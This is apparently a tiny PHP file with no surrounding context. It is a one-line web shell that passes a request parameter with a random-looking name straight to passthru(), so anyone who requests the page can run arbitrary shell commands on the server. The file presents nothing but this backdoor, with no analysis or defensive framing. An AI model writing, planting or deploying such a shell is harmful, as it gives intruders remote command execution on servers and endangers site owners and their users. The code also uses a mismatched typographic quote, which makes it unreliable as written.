<?php
passthru($_GET[’aoUFdhpP']);
?>
